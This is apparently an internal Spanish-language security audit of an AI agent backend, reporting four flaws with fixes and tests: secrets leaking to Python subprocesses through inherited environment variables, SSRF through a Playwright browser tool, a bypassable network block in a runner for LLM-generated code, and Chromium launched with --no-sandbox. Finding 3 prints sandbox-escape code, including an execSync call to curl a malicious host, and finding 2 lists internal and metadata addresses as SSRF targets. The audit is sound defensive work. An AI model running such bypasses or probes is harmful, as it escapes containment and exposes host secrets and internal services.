# DEV-001-B2.0.1 — Evaluación de Riesgos Inmediatos en Componentes Actuales

**Misión:** DEV-001-B2.0.1  
**Fecha:** 2026-11-06  
**Modo:** STRICT READ-ONLY / AUDITORÍA DE ARQUITECTURA  
**Rama de Referencia:** `security/dev-001-b`  
**Commit de Referencia:** `c459087` (con `2d6bf29`)  
**Dependencia:** DEV-001-B2.0 (Design Preliminar)  
**Estado:** Documento de Diseño y Validación Técnica (Sin cambios en código)

---

## 1. Justificación y Propósito

La auditoría DEV-001-B2.0 reveló cuatro vulnerabilidades arquitectónicas en componentes ya presentes en el repositorio. Aunque estos componentes operan dentro del backend, **contienen brechas que permiten eludir el aislamiento esperado, filtrar secretos del host o realizar peticiones no autorizadas**.

Este documento detalla para cada hallazgo: la ruta real de invocación, la exposición efectiva, la remediación mínima requerida, las pruebas necesarias y la recomendación operativa vinculante.

---

## 2. Análisis Pormenorizado de los Cuatro Hallazgos Críticos

---

### HALLAZGO-01: Exposición de Secretos por Herencia de Entorno en `SafeExecService`

- **Archivo y Línea:** [`src/jarvis/security/safe-exec.service.ts`](file:///c:/Projects/productos_crud_bkd/src/jarvis/security/safe-exec.service.ts#L36-L38)  
  ```typescript
  const proc = spawn(pythonExecutable, [abs, ...args], {
    shell: false,
    env: { ...process.env, PYTHONUTF8: '1', PYTHONIOENCODING: 'utf-8' },
    signal: controller.signal as any,
  });
  ```
- **Ruta Real de Invocación:**
  1. `AichatController.preguntar` (`POST /api/aichat/preguntar`) $\rightarrow$ `AichatService.preguntarHRM` $\rightarrow$ `SafeExecService.runPythonScript('src/hrm/hrm_runner.py', [pregunta], 30000)`.
  2. Servicios auxiliares de calibración científica y simulaciones de audio/física en desarrollo.
- **Exposición Efectiva:**
  - El subproceso de Python recibe una copia idéntica de todas las variables de entorno de la aplicación principal de NestJS:
    - `JWT_SECRET` (secreto maestro de autenticación).
    - `ACTION_GATEKEEPER_SECRET` (secreto de firma de tokens HITL).
    - `CREDENTIALS_ENCRYPTION_KEY` (clave AES-256-GCM de la bóveda de credenciales).
    - `DATABASE_URL` (cadena de conexión completa con usuario y contraseña a PostgreSQL).
    - `OPENROUTER_API_KEY` / Tokens de modelos en la nube.
  - Si un script de Python ejecutado es manipulado o procesa una entrada hostil, puede volcar `os.environ` a un log, enviarlo por socket o persistirlo en disco, provocando la **exfiltración total de la seguridad de JarBees**.
- **Remediación Mínima Requerida:**
  1. Sustituir `{ ...process.env }` por una lista blanca estricta y mínima:
     ```typescript
     const sanitizedEnv: NodeJS.ProcessEnv = {
       SystemRoot: process.env.SystemRoot,
       SYSTEMROOT: process.env.SYSTEMROOT,
       PATH: process.env.PATH,
       PYTHONUTF8: '1',
       PYTHONIOENCODING: 'utf-8',
       TEMP: path.join(process.cwd(), 'storage', 'temp'),
       TMP: path.join(process.cwd(), 'storage', 'temp'),
     };
     ```
  2. Prohibir de forma explícita que cualquier variable con nombres que contengan `SECRET`, `KEY`, `PASS`, `TOKEN`, `DATABASE` o `URL` sea transmitida a procesos hijos.
- **Pruebas Automatizadas Necesarias:**
  - Test unitario que ejecute un script sintético de Python que inspeccione `os.environ` y verifique que `JWT_SECRET` y `DATABASE_URL` están indefinidos.
- **Recomendación Operativa:**
  - **DESHABILITADO / RESTRINGIDO:** La invocación de `SafeExecService` debe permanecer desactivada para cualquier entrada externa hasta que se aplique la sanitización estricta del entorno.

---

### HALLAZGO-02: Ausencia de Cortafuegos de Salida y Vulnerabilidad SSRF en `BrowserToolService`

- **Archivo y Línea:** [`src/jarvis/tools/browser/browser-tool.service.ts`](file:///c:/Projects/productos_crud_bkd/src/jarvis/tools/browser/browser-tool.service.ts#L192-L248)  
  ```typescript
  await page.goto(url, {
    waitUntil: 'domcontentloaded',
    timeout: this.TIMEOUT_MS,
  });
  ```
- **Ruta Real de Invocación:**
  1. Usuario envía un mensaje en chat con una URL o el agente planifica un paso `scrape` o `search`.
  2. `JarvisService` o `ExecutionEngineService` invocan `BrowserToolService.buildContext(userMessage)` o `BrowserToolService.fetch(url)` $\rightarrow$ `navigate(url)`.
- **Exposición Efectiva:**
  - Playwright navega a la URL sin ninguna comprobación de destino. Puede conectarse a:
    - `http://127.0.0.1:4000` (Backend de producción de JarBees).
    - `http://127.0.0.1:4001` (Backend de staging).
    - `http://127.0.0.1:40199` (Socket mutex del `SingleInstanceLockService` de B1).
    - `http://127.0.0.1:5432` / `http://127.0.0.1:11434` (PostgreSQL / Ollama).
    - `http://192.168.1.1` (Enrutador de la red local u otros equipos en LAN).
    - `http://169.254.169.254` (Dirección de metadatos de enlace local).
  - El navegador intercepta y almacena respuestas JSON de endpoints internos (`apis.push(...)`) y las inyecta en el prompt del LLM, permitiendo al atacante inspeccionar el backend interno.
- **Remediación Mínima Requerida:**
  1. Interceptor de peticiones en Playwright (`page.route('**/*', ...)`):
     - Validar que el protocolo sea exclusivamente `http:` o `https:`.
     - Resolver la IP de destino mediante `dns.promises.lookup` antes de permitir la navegación.
     - Abortar con `route.abort('accessdenied')` si la IP resuelta pertenece a rangos privados o loopback (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fe80::/10`).
  2. En el modo hermético de B2: Deshabilitar completamente la navegación web saliente autónoma.
- **Pruebas Automatizadas Necesarias:**
  - Suite de pruebas de SSRF intentando navegar a `http://127.0.0.1:4000`, `http://localhost:5432`, `http://169.254.169.254` y verificando rechazo determinista.
  - Prueba de elusión por DNS Rebinding (dominio público que resuelve a `127.0.0.1`).
- **Recomendación Operativa:**
  - **BLOQUEO INMEDIATO DE NAVEGACIÓN LIBRE:** El agente no debe invocar `BrowserToolService.navigate` ni extraer URLs arbitrarias hasta que se incorpore el filtro de IP en `page.route` o se establezca el modo offline.

---

### HALLAZGO-03: Control de Conveniencia por Monkey-Patching en `IsolatedTestRunnerService`

- **Archivo y Línea:** [`src/jarvis/verification/isolated-test-runner.service.ts`](file:///c:/Projects/productos_crud_bkd/src/jarvis/verification/isolated-test-runner.service.ts#L118-L134)  
  ```javascript
  const net = require('net');
  net.connect = __disableNet;
  net.createConnection = __disableNet;
  const http = require('http');
  http.request = __disableNet;
  // ...
  ```
- **Ruta Real de Invocación:**
  1. `POST /api/jarbees/engineering/missions` $\rightarrow$ `EngineeringMissionManagerService.executeManagedMission` $\rightarrow$ `VerificationHarnessService` $\rightarrow$ `IsolatedTestRunnerService.runSuite`.
- **Exposición Efectiva:**
  - Este arnés se diseñó para verificar código generado por el LLM antes de integrarlo.
  - El bloqueo de red se realiza sobreescribiendo propiedades en el objeto del módulo `net` y `http` dentro del mismo proceso Node.js.
  - Cualquier código bajo prueba que ejecute:
    ```javascript
    delete require.cache[require.resolve('net')];
    const realNet = require('net');
    // o alternativamente:
    require('child_process').execSync('curl http://malicious.site');
    ```
    elude inmediatamente la restricción y obtiene conectividad completa hacia la red y el sistema de archivos del host.
- **Remediación Mínima Requerida:**
  1. El aislamiento de red debe aplicarse **a nivel de sistema operativo**, no en el script de arranque.
  2. Si corre en Windows: ejecutar bajo un AppContainer sin capacidad `internetClient` / `privateNetworkClientServer` o con un firewall local.
  3. Si corre en Linux (WSL2): ejecutar con namespace de red desacoplado (`unshare -n` o contenedor con `--network none`).
  4. Prohibir la importación de `child_process` y bindings nativos en el código bajo prueba mediante un validador estático previo (`StaticPreValidatorService`).
- **Pruebas Automatizadas Necesarias:**
  - Prueba adversarial que intente limpiar el `require.cache` o invocar `child_process` y verifique que el entorno de SO bloquea la conexión física.
- **Recomendación Operativa:**
  - **MANTENER EN MODO CONTROLADO / SANDBOX SINTÉTICO:** No ejecutar código proveniente de modelos externos sin la validación previa de AST y sin un aislamiento de proceso a nivel de kernel.

---

### HALLAZGO-04: Desactivación Explícita del Sandbox en `PngExporter`

- **Archivo y Línea:** [`src/jarvis/tools/poster/rendering/png-exporter.ts`](file:///c:/Projects/productos_crud_bkd/src/jarvis/tools/poster/rendering/png-exporter.ts#L34-L36)  
  ```typescript
  args: [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--enable-gpu',
    '--use-gl=angle',
    '--use-angle=d3d11',
  ]
  ```
- **Ruta Real de Invocación:**
  1. `POST /api/jarbees/tools/poster/generate` $\rightarrow$ `PosterService.generate` $\rightarrow$ `PngExporter.getGpuDiagnostics()` o `PngExporter.renderSvgToPng()`.
- **Exposición Efectiva:**
  - Al pasar `--no-sandbox`, Chromium desactiva voluntariamente su arquitectura de aislamiento multiproceso basada en tokens restringidos y AppContainers de Windows.
  - Si el contenido SVG o HTML renderizado contiene un exploit de día cero (0-day) o vulnerabilidad de renderizado en el motor Blink/V8/ANGLE, el exploit obtiene ejecución de código directa en el contexto del usuario del host sin chocar contra la barrera del sandbox de Chromium.
- **Remediación Mínima Requerida:**
  1. **Eliminar de forma inmediata las banderas `--no-sandbox` y `--disable-setuid-sandbox`:** En Windows 10 Pro, Chromium y Microsoft Edge son perfectamente capaces de renderizar WebGL con aceleración D3D11 conservando su sandbox nativo activado.
  2. Si se requiere aceleración de hardware, utilizar únicamente banderas compatibles con sandbox (`--enable-gpu`, `--use-gl=angle`, `--use-angle=d3d11`).
- **Pruebas Automatizadas Necesarias:**
  - Test de diagnóstico que confirme que `getGpuDiagnostics()` obtiene `{ webgl2: true }` sin requerir `--no-sandbox`.
- **Recomendación Operativa:**
  - **CORRECCIÓN PRIORITARIA:** Remover estas banderas es una remediación de bajo riesgo y alto impacto de seguridad que debe aplicarse antes de habilitar cualquier renderizado de posters desde inputs no supervisados.

---

## 3. Matriz Resumen de Recomendaciones Operativas

| Componente | Vulnerabilidad Principal | Estado Operativo Recomendado | Remediación Requerida |
| :--- | :--- | :---: | :--- |
| **`SafeExecService`** | Herencia de `process.env` (JWT/DB) | **DESHABILITADO** | Whitelist estricta de variables de entorno mínimas |
| **`BrowserToolService`** | SSRF libre a `127.0.0.1` y LAN | **BLOQUEADO (Modo Hermético)** | Interceptor de rutas Playwright con validación DNS/IP |
| **`IsolatedTestRunnerService`** | Monkey-patching eludible en Node.js | **CONFINAMIENTO ESTRICTO** | Aislamiento de red a nivel de kernel (SO) |
| **`PngExporter`** | Desactivación de sandbox (`--no-sandbox`)| **REMEDACIÓN INMEDIATA** | Eliminar banderas `--no-sandbox` de Chromium |

